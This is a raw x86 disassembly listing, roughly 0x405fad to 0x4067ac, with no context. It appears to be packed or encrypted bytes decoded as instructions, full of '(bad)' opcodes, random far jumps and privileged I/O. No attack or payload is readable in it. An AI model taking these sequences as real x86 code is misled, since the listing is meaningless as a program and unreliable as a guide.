  405fad:	and    al,0xf
  405faf:	pusha  
  405fb0:	push   0x23156050
  405fb5:	cmp    BYTE PTR [esi+0x69ea7faa],bl
  405fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fbc:	mov    ah,0xbe
  405fbe:	fild   QWORD PTR [ebx+0x54c40ee6]
  405fc4:	jbe    0x405ff1
  405fc6:	and    esi,DWORD PTR [ecx-0x6372ac6f]
  405fcc:	inc    esi
  405fcd:	std    
  405fce:	and    BYTE PTR [eax+0x46],bl
  405fd1:	jl     0x405fb7
  405fd3:	xor    al,0x79
  405fd5:	cdq    
  405fd6:	xor    dl,BYTE PTR [ecx]
  405fd8:	sub    al,BYTE PTR [ebx]
  405fda:	sbb    DWORD PTR [edi-0x22],edi
  405fdd:	xchg   edx,eax
  405fde:	lahf   
  405fdf:	rcl    BYTE PTR [edi+0x68],1
  405fe2:	dec    ebp
  405fe3:	pushf  
  405fe4:	xor    esi,ecx
  405fe6:	ins    DWORD PTR es:[edi],dx
  405fe7:	push   ecx
  405fe8:	cmp    eax,0x5a068482
  405fed:	les    edx,FWORD PTR [edx-0x67]
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	test   al,0x6e
  406008:	jecxz  0x406027
  40600a:	mov    edx,eax
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x406051
  406013:	xchg   ebp,eax
  406014:	and    BYTE PTR [edx-0x445af5ea],dh
  40601a:	jnp    0x405fd6
  40601c:	das    
  40601d:	cld    
  40601e:	ror    BYTE PTR [edx+0x31fa9d41],cl
  406024:	(bad)  
  406025:	jo     0x405fee
  406027:	inc    ebp
  406028:	inc    eax
  406029:	add    eax,ebp
  40602b:	test   al,0xc4
  40602d:	nop
  40602e:	pop    ss
  40602f:	out    0xe8,eax
  406031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406032:	sti    
  406033:	xchg   ebp,eax
  406034:	push   0x43296c40
  406039:	call   0xe660:0x2d43bdeb
  406040:	in     eax,dx
  406041:	pop    ds
  406042:	xor    bl,bl
  406044:	out    dx,eax
  406045:	ficomp DWORD PTR [eax+eiz*4-0x41bf54a2]
  40604c:	xchg   ebx,eax
  40604d:	sbb    eax,DWORD PTR [eax]
  40604f:	jge    0x405fe3
  406051:	cmc    
  406052:	aaa    
  406053:	sbb    BYTE PTR [ecx],ah
  406055:	or     DWORD PTR [eax+0x21],0x2516279
  40605c:	jbe    0x406072
  40605e:	gs leave 
  406060:	test   al,0x9
  406062:	add    bl,cl
  406064:	repnz adc cl,BYTE PTR [ecx+0x2]
  406068:	(bad)  
  406069:	jne    0x405ff3
  40606b:	sbb    ebp,DWORD PTR [ebp+edx*2-0x1b]
  40606f:	push   ss
  406070:	clc    
  406071:	sub    DWORD PTR [eax+esi*2-0x2],edi
  406075:	push   esi
  406076:	js     0x4060da
  406078:	push   cs
  406079:	inc    ecx
  40607a:	and    eax,0xf925c8bd
  40607f:	(bad)  
  406080:	mov    cl,0xc4
  406082:	sub    esi,DWORD PTR [ecx]
  406084:	mov    ds:0x14e55e83,al
  406089:	rcl    bh,0x5b
  40608c:	dec    ebx
  40608d:	mov    esi,0x1a4c308a
  406092:	push   esp
  406093:	add    al,BYTE PTR [edx+0x5e47cd02]
  406099:	mov    ebp,0xe3be578c
  40609e:	pop    ds
  40609f:	imul   ebx,DWORD PTR [edx-0x44d43491],0x2a
  4060a6:	retf   
  4060a7:	mov    edx,0x2790696f
  4060ac:	mov    DWORD PTR [esi],edx
  4060ae:	pop    ecx
  4060af:	lea    edi,[ecx-0x32]
  4060b2:	mov    dl,0x8d
  4060b4:	and    DWORD PTR [ebx-0x5cfe1609],esp
  4060ba:	add    BYTE PTR [eax+0xd],cl
  4060bd:	add    al,0x29
  4060bf:	and    eax,0x4f248b94
  4060c4:	pop    es
  4060c5:	sti    
  4060c6:	call   0x6e3:0xcc71e08
  4060cd:	lods   eax,DWORD PTR ds:[esi]
  4060ce:	xor    eax,0x93dd0c5e
  4060d3:	jmp    0xa9f2fb6d
  4060d8:	fstp   DWORD PTR [ecx-0x5c]
  4060db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060dc:	add    dl,BYTE PTR es:[edx-0x3a]
  4060e0:	nop
  4060e1:	push   esi
  4060e2:	and    cl,BYTE PTR [edi+0x27656973]
  4060e8:	stos   BYTE PTR es:[edi],al
  4060e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ea:	push   esi
  4060eb:	(bad)  
  4060ec:	xchg   ecx,eax
  4060ed:	out    0x7b,al
  4060ef:	adc    edx,DWORD PTR [ebx+edi*1-0x34]
  4060f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060f4:	addr16 ret 0xcdea
  4060f8:	cmp    edi,edi
  4060fa:	iret   
  4060fb:	push   ebx
  4060fc:	lods   eax,DWORD PTR ds:[esi]
  4060fd:	sbb    DWORD PTR [edi-0x3d],eax
  406100:	pop    eax
  406101:	mov    BYTE PTR [edx],dl
  406103:	mov    bh,0x1d
  406105:	jmp    0x4060d4
  406107:	neg    BYTE PTR [ebx]
  406109:	cld    
  40610a:	mov    dh,0x8a
  40610c:	sar    BYTE PTR [esi+0xf591406],0xf0
  406113:	sub    bh,al
  406115:	pushf  
  406116:	imul   ecx,DWORD PTR [esi+0x7ce553a0],0xb6d6a4f7
  406120:	sub    al,0x6d
  406122:	jl     0x4060b6
  406124:	icebp  
  406125:	pop    ebp
  406126:	add    al,0xd2
  406128:	iret   
  406129:	int3   
  40612a:	lock dec ecx
  40612c:	sub    DWORD PTR [edx-0x14],edi
  40612f:	adc    dl,BYTE PTR [ecx]
  406131:	ja     0x4060c3
  406133:	mov    eax,ds:0xd6c58099
  406138:	shr    BYTE PTR [ecx-0x68],0x80
  40613c:	loopne 0x40618a
  40613e:	ins    DWORD PTR es:[edi],dx
  40613f:	cmp    esi,DWORD PTR [ebx]
  406141:	push   ecx
  406142:	loope  0x40614c
  406144:	arpl   WORD PTR ss:[edx+ebp*4-0x26],si
  406149:	xor    DWORD PTR [eax+ebx*8],eax
  40614c:	(bad)  
  40614d:	(bad)  
  40614e:	fxch   st(3)
  406150:	cdq    
  406151:	mov    al,0x8a
  406153:	ss clc 
  406155:	inc    edi
  406156:	push   ecx
  406157:	adc    ebx,DWORD PTR [ebx-0x3228dd0d]
  40615d:	add    BYTE PTR ds:0xc5d1a076,bh
  406163:	dec    eax
  406164:	pop    edi
  406165:	inc    ecx
  406166:	jmp    0xffc9:0x128db211
  40616d:	push   esp
  40616e:	add    bh,BYTE PTR [edi+0x51011d63]
  406174:	add    eax,0xd9d58343
  406179:	mov    ds:0x826953d8,eax
  40617e:	pop    edi
  40617f:	pop    ebx
  406180:	mov    eax,0xe3b12de
  406185:	xchg   DWORD PTR [esi],esi
  406187:	fstp   QWORD PTR [esi+0x21293c60]
  40618d:	js     0x40611b
  40618f:	push   ds
  406190:	ficom  DWORD PTR [edi+esi*8-0x4c]
  406194:	cmp    dl,BYTE PTR [esi]
  406196:	mov    ch,0x3c
  406198:	push   cs
  406199:	or     al,0x66
  40619b:	fmul   DWORD PTR [ebx+eax*8+0x67]
  40619f:	scas   al,BYTE PTR es:[edi]
  4061a0:	mov    ah,0xd1
  4061a2:	fnstcw WORD PTR [esi+edi*4+0x33014b6]
  4061a9:	and    BYTE PTR [edx+0x2c879d96],bl
  4061af:	out    dx,al
  4061b0:	ror    edx,cl
  4061b2:	lds    edi,FWORD PTR [ecx]
  4061b4:	xchg   edi,eax
  4061b5:	(bad)  
  4061b6:	aaa    
  4061b7:	cmp    BYTE PTR ds:0x8f62b9c3,bl
  4061bd:	lahf   
  4061be:	mov    ds:0xad776d5e,eax
  4061c3:	or     ebp,eax
  4061c5:	in     al,dx
  4061c6:	ins    DWORD PTR es:[edi],dx
  4061c7:	xchg   edi,eax
  4061c8:	fdivr  DWORD PTR [esp+eiz*8]
  4061cb:	jmp    0x406244
  4061cd:	push   cs
  4061ce:	or     BYTE PTR [eax],cl
  4061d0:	and    al,0x83
  4061d2:	aad    0x4a
  4061d4:	aam    0x9a
  4061d6:	cmp    al,0xa1
  4061d8:	xchg   ebx,eax
  4061d9:	pop    edi
  4061da:	(bad)  
  4061db:	and    al,0xd0
  4061dd:	pop    edx
  4061de:	xor    bh,BYTE PTR [ebp-0x37]
  4061e1:	add    bl,0xd4
  4061e4:	push   ecx
  4061e5:	push   0x246fd3ce
  4061ea:	call   0x12c15fc7
  4061ef:	jl     0x406239
  4061f1:	es sahf 
  4061f3:	xor    eax,0x4981989
  4061f8:	push   es
  4061f9:	xchg   ebp,eax
  4061fa:	mov    edi,edx
  4061fc:	pop    ebx
  4061fd:	shr    BYTE PTR [edx+0x38],0x3b
  406201:	and    edi,DWORD PTR [eax+0x6cfc65de]
  406207:	jle    0x406241
  406209:	add    al,BYTE PTR [edx+0x27]
  40620c:	or     dl,BYTE PTR [eax]
  40620e:	fs js  0x40623c
  406211:	sti    
  406212:	ins    DWORD PTR es:[edi],dx
  406213:	popf   
  406214:	pop    ecx
  406215:	jmp    0x4728:0x6823924c
  40621c:	dec    esi
  40621d:	in     al,dx
  40621e:	sub    ah,BYTE PTR [ebx]
  406220:	and    bl,BYTE PTR [edi+0x55093373]
  406226:	xor    bh,BYTE PTR [edx-0x5b6e72ff]
  40622c:	xor    eax,0xd386fc0
  406231:	ror    BYTE PTR [edi+0x7c],0xf2
  406235:	inc    edx
  406236:	jnp    0x406244
  406238:	sti    
  406239:	(bad)
  40623d:	call   DWORD PTR [ebp+0xa0f30a0]
  406243:	ret    
  406244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406245:	fwait
  406246:	xor    DWORD PTR [esi],esi
  406248:	sub    ebx,DWORD PTR [eax-0x2f]
  40624b:	jecxz  0x406261
  40624d:	adc    BYTE PTR [ebx+eiz*4],dh
  406250:	sahf   
  406251:	rcr    edi,cl
  406253:	outs   dx,DWORD PTR ds:[esi]
  406254:	pop    ss
  406255:	xor    DWORD PTR [ecx],esp
  406257:	pop    ebp
  406258:	mov    al,0xd1
  40625a:	retf   0xf759
  40625d:	mov    esp,0x7e6312f
  406263:	adc    BYTE PTR [esp+esi*1+0x2e],cl
  406267:	test   al,0x9c
  406269:	fbstp  TBYTE PTR [eax]
  40626b:	retf   0x4e66
  40626e:	leave  
  40626f:	pushf  
  406270:	and    edi,DWORD PTR [esi-0x7c]
  406273:	xor    eax,0x541f7b1b
  406278:	mov    BYTE PTR ds:0xe7b7ef5e,dh
  40627e:	test   DWORD PTR [esi-0x6e],ebx
  406281:	imul   ebx,DWORD PTR [ebx+0x78],0xffffffaa
  406285:	retf   
  406286:	mov    edx,0xf9194
  40628b:	popa   
  40628c:	jmp    0x406246
  40628e:	mov    ecx,0x7fb4c7bc
  406293:	out    dx,eax
  406294:	pop    esi
  406295:	and    eax,0x5fc4dd09
  40629a:	inc    ecx
  40629b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40629c:	retf   0x3f57
  40629f:	mov    WORD PTR [edx+0x1b],ss
  4062a2:	jns    0x406323
  4062a4:	push   eax
  4062a5:	or     BYTE PTR [ecx-0x138cfdc3],cl
  4062ab:	push   0x4d8bb0ca
  4062b0:	pop    ds
  4062b1:	pop    es
  4062b2:	in     al,dx
  4062b3:	push   ds
  4062b4:	addr16 sbb eax,0x32078bb0
  4062ba:	mov    esi,0xfc0c2149
  4062bf:	or     DWORD PTR [eax+0x347fb3e1],ecx
  4062c5:	push   0xffffff9f
  4062c7:	mov    ebx,0x9b9e0aa3
  4062cc:	inc    ebp
  4062cd:	mov    ?,WORD PTR [ecx-0x61]
  4062d0:	(bad)  
  4062d1:	mov    ecx,DWORD PTR [edx-0x76d93865]
  4062d7:	dec    edi
  4062d8:	add    DWORD PTR [esi+0x7722508c],0x2174efad
  4062e2:	fdiv   QWORD PTR [edi-0x740e08f4]
  4062e8:	dec    ebp
  4062e9:	adc    cl,ch
  4062eb:	jmp    0x4062ef
  4062ed:	add    BYTE PTR [eax],al
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0xb8334d5c
  4062fe:	repz faddp st(7),st
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x4062ff
  406308:	out    0x99,al
  40630a:	repz ret 
  40630c:	std    
  40630d:	loopne 0x406315
  40630f:	fwait
  406310:	jmp    0xc812:0x728b794b
  406317:	mov    edx,esi
  406319:	dec    ebx
  40631a:	loope  0x40632b
  40631c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40631d:	dec    edi
  40631e:	mov    edi,0x1fb0b7dc
  406323:	push   edi
  406324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406325:	add    DWORD PTR [ebx-0xf5fe01e],edi
  40632b:	div    BYTE PTR [eax+0x58]
  40632e:	mov    esi,0x507328e7
  406333:	sti    
  406334:	ins    BYTE PTR es:[edi],dx
  406335:	jmp    0xa89e0dd4
  40633a:	inc    ecx
  40633b:	mov    ss,edx
  40633d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40633e:	(bad)  
  40633f:	aad    0xae
  406341:	add    edx,DWORD PTR [edx+ecx*2+0x11]
  406345:	loopne 0x406369
  406347:	or     BYTE PTR cs:[eax+0x73f80e55],0x2d
  40634f:	jae    0x406385
  406351:	gs loopne 0x4063b5
  406354:	xor    BYTE PTR [ebp+eiz*1+0x15],bh
  406358:	pop    esp
  406359:	push   0xd3535619
  40635e:	inc    ebp
  40635f:	mov    edx,0x681e358
  406364:	cld    
  406365:	sub    eax,0xbf83a096
  40636a:	push   esi
  40636b:	fadd   QWORD PTR [ebp+0x548c5b75]
  406371:	gs dec edx
  406373:	xor    edi,DWORD PTR [ecx+0x1d09cc5c]
  406379:	sbb    DWORD PTR [eax-0x77],ecx
  40637c:	mov    al,ds:0x6e026487
  406381:	jecxz  0x40631a
  406383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406384:	cmp    BYTE PTR [ebx+0x4a],bl
  406387:	xchg   ebp,eax
  406388:	dec    edx
  406389:	ret    0xb075
  40638c:	mov    ds:0x5e30a52d,eax
  406391:	xchg   ebp,eax
  406392:	jecxz  0x406326
  406394:	dec    ebp
  406395:	jae    0x4063ba
  406397:	leave  
  406398:	(bad)  
  406399:	call   0x26ee:0xe35ce9e2
  4063a0:	lods   al,BYTE PTR ds:[esi]
  4063a1:	(bad)  
  4063a2:	jle    0x4063c3
  4063a4:	sti    
  4063a5:	ret    0xf718
  4063a8:	inc    edx
  4063a9:	test   DWORD PTR [esi-0x5b03894f],ecx
  4063af:	mov    bl,0x2c
  4063b1:	inc    eax
  4063b2:	ficom  DWORD PTR [eax-0x59]
  4063b5:	repz retf 0x8755
  4063b9:	add    esp,ebp
  4063bb:	push   ss
  4063bc:	adc    ch,BYTE PTR [ebp+0x5f]
  4063bf:	test   BYTE PTR [esi+0x22],0x27
  4063c3:	ss ret 
  4063c5:	sbb    DWORD PTR [eax-0x2b],ecx
  4063c8:	cmc    
  4063c9:	jmp    0x40635d
  4063cb:	mov    esp,0x74a22e3c
  4063d0:	xchg   edi,eax
  4063d1:	mov    ebx,0x77986caa
  4063d6:	fsqrt  
  4063d8:	adc    bl,0xd6
  4063db:	test   BYTE PTR [ecx],ah
  4063dd:	cmp    ah,BYTE PTR [esi-0x1b0a472a]
  4063e3:	fisub  WORD PTR [edi+0x70]
  4063e6:	xor    eax,0xfcd76ff
  4063eb:	mov    esp,0x1260ef07
  4063f0:	das    
  4063f1:	xchg   ecx,eax
  4063f2:	push   esi
  4063f3:	std    
  4063f4:	imul   ebp,esi,0xffffff8d
  4063f7:	stc    
  4063f8:	jb     0x406456
  4063fa:	into   
  4063fb:	scas   eax,DWORD PTR es:[edi]
  4063fc:	push   edx
  4063fd:	je     0x406386
  4063ff:	es mov ebp,0xad3f524d
  406405:	cs cld 
  406407:	jne    0x4063b9
  406409:	stc    
  40640a:	das    
  40640b:	cmc    
  40640c:	ins    DWORD PTR es:[edi],dx
  40640d:	xchg   BYTE PTR [ebx],cl
  40640f:	xor    BYTE PTR [ebx],ah
  406411:	push   es
  406412:	mov    cl,0xbe
  406414:	mov    eax,0x99f3de95
  406419:	imul   edx,DWORD PTR ds:0xccbf24e8,0xae85b485
  406423:	sahf   
  406424:	jecxz  0x4063c2
  406426:	xor    esi,0xe3159daa
  40642c:	fdivr  QWORD PTR [ebx+0x4a18119d]
  406432:	ror    DWORD PTR [ebp+edx*8-0x3793f4ba],cl
  406439:	les    eax,FWORD PTR [edx+0x2f7e81d5]
  40643f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406440:	cs cmp esp,edx
  406443:	dec    ebp
  406444:	jbe    0x4064bf
  406446:	sbb    ebx,ebp
  406448:	pop    ebx
  406449:	jg     0x4063d2
  40644b:	xchg   ebp,edx
  40644d:	lock or DWORD PTR [edi+0x71],esi
  406451:	push   ebp
  406452:	or     dh,dl
  406454:	dec    edi
  406455:	je     0x40642a
  406457:	std    
  406458:	mov    ds:0x4d33c8b2,eax
  40645d:	dec    edi
  40645e:	test   al,0x79
  406460:	sbb    BYTE PTR [ebx+0x7e],0xaf
  406464:	sbb    esi,DWORD PTR [esi+edx*4+0x67]
  406468:	xchg   ebx,eax
  406469:	sub    dh,BYTE PTR [edi-0x6d]
  40646c:	xor    ebx,eax
  40646e:	not    cl
  406470:	jl     0x4064e6
  406472:	sub    DWORD PTR [edi],0x3e1c8d0c
  406478:	add    BYTE PTR [ebx+0x54],0xa4
  40647c:	xor    esi,esi
  40647e:	mov    bl,0x92
  406480:	dec    ecx
  406481:	mov    eax,0xbc0eefc9
  406486:	add    DWORD PTR [ecx],ecx
  406488:	(bad)
  40648c:	jle    0x406462
  40648e:	in     al,dx
  40648f:	(bad)  
  406490:	fcomp  QWORD PTR [edx-0x39c7503c]
  406496:	xchg   BYTE PTR [esi-0xac5d691],bh
  40649c:	lea    edx,ds:0x3a92dfe7
  4064a2:	adc    al,0xa
  4064a4:	pop    esp
  4064a5:	mov    ebp,0x5fc8c18
  4064aa:	loope  0x4064d4
  4064ac:	inc    ebx
  4064ad:	jne    0x406523
  4064af:	xor    al,0xf1
  4064b1:	jbe    0x40648c
  4064b3:	fwait
  4064b4:	add    DWORD PTR [ebp+0x34],eax
  4064b7:	xchg   BYTE PTR [ebx],ah
  4064b9:	cmp    BYTE PTR [esi+0x32],dh
  4064bc:	nop
  4064bd:	pushf  
  4064be:	dec    ebx
  4064bf:	inc    esi
  4064c0:	pop    esi
  4064c1:	xchg   esi,eax
  4064c2:	jne    0x40648c
  4064c4:	mov    eax,0x5c70c54d
  4064c9:	call   0xfa02ee53
  4064ce:	jno    0x40652b
  4064d0:	push   ss
  4064d1:	or     al,0x71
  4064d3:	push   edi
  4064d4:	and    eax,DWORD PTR [esi+0x4c41564f]
  4064da:	xchg   ebp,esi
  4064dc:	pushf  
  4064dd:	out    0xd7,al
  4064df:	add    dl,dh
  4064e1:	add    DWORD PTR [eax+0x33],eax
  4064e4:	xor    eax,0xfd936d8b
  4064e9:	sub    eax,0x548a9d76
  4064ee:	in     al,dx
  4064ef:	cmc    
  4064f0:	rcl    BYTE PTR [esi+0x27],0xef
  4064f4:	fdiv   QWORD PTR [eax-0x18]
  4064f7:	mov    esi,0xab3217d0
  4064fc:	xchg   BYTE PTR es:0x79fe18dd,dl
  406503:	mov    ecx,0xa9842fa2
  406508:	hlt    
  406509:	pop    esp
  40650a:	mov    ecx,0xc3de691e
  40650f:	and    BYTE PTR [ebx],dh
  406511:	xchg   edi,edx
  406513:	(bad)  
  406514:	stos   BYTE PTR es:[edi],al
  406515:	rcl    DWORD PTR [ebp-0x3c],1
  406518:	mov    eax,ds:0x9a4be902
  40651d:	mov    esp,0x8cd5710b
  406522:	mov    al,0x93
  406524:	inc    ebp
  406525:	mov    bl,0x3d
  406527:	and    BYTE PTR [eax],dh
  406529:	mov    dl,0x9c
  40652b:	ins    DWORD PTR es:[edi],dx
  40652c:	pop    ebp
  40652d:	and    esp,edx
  40652f:	and    DWORD PTR ds:0xaa8c953a,esp
  406535:	dec    ebx
  406536:	das    
  406537:	cmp    eax,0x87deddac
  40653c:	(bad)
  406540:	cdq    
  406541:	add    bh,cl
  406543:	out    dx,eax
  406544:	push   edi
  406545:	lock outs dx,DWORD PTR ss:[esi]
  406548:	jo     0x4064e0
  40654a:	push   cs
  40654b:	sbb    al,0x7b
  40654d:	jne    0x4064fc
  40654f:	aad    0x6d
  406551:	mov    bh,0x8b
  406553:	jb     0x40655f
  406555:	pop    esi
  406556:	ins    DWORD PTR es:[edi],dx
  406557:	ret    
  406558:	jo     0x406599
  40655a:	push   ss
  40655b:	dec    ecx
  40655c:	aaa    
  40655d:	cmp    DWORD PTR [edi-0xac89f71],edi
  406563:	popf   
  406564:	sub    eax,0x90ac0bcc
  406569:	sub    edi,ebp
  40656b:	bound  edx,QWORD PTR [ebx]
  40656d:	pusha  
  40656e:	cmp    dh,dl
  406570:	add    eax,0x4a9202a3
  406575:	outs   dx,DWORD PTR ds:[esi]
  406576:	out    dx,al
  406577:	and    al,0x7d
  406579:	arpl   WORD PTR gs:[ebp+0x50],bp
  40657d:	cwde   
  40657e:	out    dx,eax
  40657f:	add    ecx,DWORD PTR [ebx]
  406581:	ja     0x406510
  406583:	ror    DWORD PTR [edx+0xc55d0a6],0xc3
  40658a:	data16 das 
  40658c:	pushf  
  40658d:	pop    es
  40658e:	ins    BYTE PTR es:[edi],dx
  40658f:	xchg   ecx,eax
  406590:	imul   esi,DWORD PTR [ecx-0x1c787303],0xffffffc8
  406597:	test   eax,0x8563faeb
  40659c:	fwait
  40659d:	in     eax,0x27
  40659f:	data16 daa 
  4065a1:	pushf  
  4065a2:	ss add al,0xda
  4065a5:	gs cli 
  4065a7:	xchg   BYTE PTR [eax+0x35],bh
  4065aa:	add    al,0xff
  4065ac:	(bad)  
  4065ae:	mov    esp,0xfe2f749d
  4065b3:	or     BYTE PTR [edx],cl
  4065b5:	fistp  DWORD PTR [esi]
  4065b7:	stc    
  4065b8:	ja     0x4065f9
  4065ba:	mov    BYTE PTR [esi+0x22],dl
  4065bd:	cdq    
  4065be:	push   0x9e77ae05
  4065c3:	mov    edx,0x2a25be14
  4065c8:	mov    WORD PTR [eax],es
  4065ca:	fdiv   QWORD PTR [ecx+0x2a]
  4065cd:	sub    BYTE PTR [esi+edx*2-0x52],al
  4065d1:	mov    ch,bh
  4065d3:	lahf   
  4065d4:	push   edi
  4065d5:	xchg   ecx,eax
  4065d6:	fadd   DWORD PTR [ebx]
  4065d8:	mov    ah,ch
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	pop    edi
  4065f6:	out    dx,al
  4065f7:	sub    eax,0x78c4336d
  4065fc:	js     0x40664b
  4065fe:	jle    0x406678
  406600:	js     0x4065fb
  406602:	fisttp WORD PTR [ebx]
  406604:	stos   DWORD PTR es:[edi],eax
  406605:	popf   
  406606:	in     al,dx
  406607:	cmc    
  406608:	mov    ebp,0xe88aa4e8
  40660d:	sbb    edi,esi
  40660f:	cwde   
  406610:	dec    ecx
  406611:	sbb    eax,0x6ee5bed
  406616:	out    dx,eax
  406617:	js     0x4065ac
  406619:	ins    BYTE PTR es:[edi],dx
  40661a:	aam    0xee
  40661c:	or     al,0x52
  40661e:	(bad)  
  40661f:	mov    ah,0x45
  406621:	push   0x90d5e7cb
  406626:	pop    esp
  406627:	in     eax,0x70
  406629:	cwde   
  40662a:	jb     0x4065fd
  40662c:	or     ebp,ebp
  40662e:	enter  0xd20e,0x9
  406632:	add    DWORD PTR [edi],ebp
  406634:	cld    
  406635:	sbb    al,0x5a
  406637:	or     eax,0xd29897c7
  40663c:	xor    DWORD PTR [esi+eax*2-0x104bdf6a],esp
  406643:	test   DWORD PTR [ebp+0x7],ecx
  406646:	dec    BYTE PTR [ebx]
  406648:	mov    eax,ds:0x9fc06b42
  40664d:	daa    
  40664e:	enter  0xa49b,0xf7
  406652:	push   cs
  406653:	nop
  406654:	mov    al,0xf6
  406656:	push   esi
  406657:	jmp    0x9563:0xd7a934d
  40665e:	dec    DWORD PTR [edi-0xe]
  406661:	or     dh,ah
  406663:	arpl   WORD PTR [edx],di
  406665:	inc    sp
  406667:	pop    esi
  406668:	mov    ah,0x61
  40666a:	adc    DWORD PTR [si-0x2cd4],eax
  40666f:	adc    eax,0xfb5e9b74
  406674:	test   bl,bl
  406676:	sbb    BYTE PTR [esi+0x29],al
  406679:	rcr    BYTE PTR [eax+0x1b],0x25
  40667d:	push   0x15f8c393
  406682:	fs dec ebp
  406684:	dec    ebp
  406685:	into   
  406686:	xchg   ecx,eax
  406687:	leave  
  406688:	lods   al,BYTE PTR ds:[esi]
  406689:	std    
  40668a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40668b:	jg     0x40664d
  40668d:	jns    0x406699
  40668f:	hlt    
  406690:	dec    edi
  406691:	ins    DWORD PTR es:[edi],dx
  406692:	adc    al,0xfd
  406694:	fwait
  406695:	ret    
  406696:	ret    
  406697:	xchg   ecx,eax
  406698:	dec    ecx
  406699:	and    eax,0x974489c2
  40669e:	cmp    edx,DWORD PTR cs:[ebx-0x78]
  4066a2:	sahf   
  4066a3:	dec    eax
  4066a4:	add    DWORD PTR [ecx+0x15c5444f],edi
  4066aa:	jns    0x40662f
  4066ac:	loope  0x406681
  4066ae:	dec    ecx
  4066af:	sub    eax,0xafc42a49
  4066b4:	jnp    0x4066a7
  4066b6:	hlt    
  4066b7:	cdq    
  4066b8:	fadd   DWORD PTR [ecx-0x690f0a32]
  4066be:	mov    ch,0xac
  4066c0:	sbb    DWORD PTR [esi],edi
  4066c2:	push   esp
  4066c3:	or     esi,DWORD PTR [ebx+0xb]
  4066c6:	rcr    DWORD PTR [ebx],1
  4066c8:	int    0xb3
  4066ca:	cld    
  4066cb:	pushf  
  4066cc:	jle    0x406661
  4066ce:	enter  0xb28a,0x3d
  4066d2:	jo     0x40673e
  4066d4:	sub    eax,0xb2aa55e5
  4066d9:	aaa    
  4066da:	cmp    ebp,DWORD PTR [esi+0x25f3b717]
  4066e0:	dec    ebp
  4066e1:	xor    ah,ch
  4066e3:	pop    edi
  4066e4:	(bad)  
  4066e5:	lock lock sub al,0xe0
  4066e9:	rcl    DWORD PTR [eax],1
  4066eb:	push   cs
  4066ec:	or     eax,0x717ceec8
  4066f1:	cmp    DWORD PTR [ebx-0x1041a91d],0xffffffb1
  4066f8:	and    ch,0x5c
  4066fb:	loope  0x4066b4
  4066fd:	aaa    
  4066fe:	(bad)  
  4066ff:	in     al,dx
  406700:	push   0x7
  406702:	leave  
  406703:	push   edx
  406704:	(bad)  
  406705:	and    DWORD PTR [ecx],edi
  406707:	dec    ebp
  406708:	out    dx,al
  406709:	dec    esp
  40670a:	popf   
  40670b:	push   edx
  40670c:	mov    ebx,0x3e243bee
  406711:	and    BYTE PTR [esi],ah
  406713:	out    dx,eax
  406714:	xchg   ebx,eax
  406715:	push   ecx
  406716:	cli    
  406717:	frstor [bx+si+0x2163]
  40671c:	adc    edi,ebx
  40671e:	(bad)  
  40671f:	push   ds
  406720:	jmp    0x1d22:0x3716583f
  406727:	push   0x2ffcb2fe
  40672c:	pop    ebx
  40672d:	jns    0x4066d4
  40672f:	in     al,dx
  406730:	imul   ebp,DWORD PTR [esi+eiz*1],0x40df9b8f
  406737:	add    BYTE PTR [edx],0xff
  40673a:	jo     0x406781
  40673c:	dec    ebx
  40673d:	and    edi,eax
  40673f:	jecxz  0x406737
  406741:	add    DWORD PTR [ebp+0xc],0x8346d16
  406748:	push   0xd8222693
  40674d:	fist   WORD PTR [edx-0x65]
  406750:	or     eax,0xc9d359dd
  406755:	xor    eax,0x9a723d15
  40675a:	leave  
  40675b:	js     0x406717
  40675d:	cs fcmovbe st,st(3)
  406760:	dec    ecx
  406761:	retf   0x989f
  406764:	(bad)  
  406765:	xchg   edi,eax
  406766:	inc    edx
  406767:	jnp    0x406780
  406769:	loopne 0x4066ee
  40676b:	aad    0x13
  40676d:	add    al,0x18
  40676f:	imul   edx,DWORD PTR ds:0x6c779388,0xffffff85
  406776:	xor    DWORD PTR [ebx-0x11],0xffffff96
  40677a:	push   es
  40677b:	or     ah,BYTE PTR [bx+di]
  40677e:	adc    esi,DWORD PTR [ebp+0x7c63647d]
  406784:	sbb    edx,DWORD PTR [eax-0x9]
  406787:	lahf   
  406788:	pop    esp
  406789:	das    
  40678a:	and    al,0x6f
  40678c:	arpl   WORD PTR [ebp-0x78],si
  40678f:	sbb    bl,al
  406791:	dec    edi
  406792:	enter  0x30cf,0xa5
  406796:	dec    eax
  406797:	int    0x85
  406799:	mov    al,BYTE PTR [ebp-0x19]
  40679c:	jb     0x4067cc
  40679e:	sub    al,0x1b
  4067a0:	mov    bl,0x8c
  4067a2:	adc    bl,BYTE PTR [eax-0x1b10e971]
  4067a8:	or     DWORD PTR [edi-0x1f],edi
  4067ab:	inc    edi
  4067ac:	ins    DWORD PTR es:[edi],dx
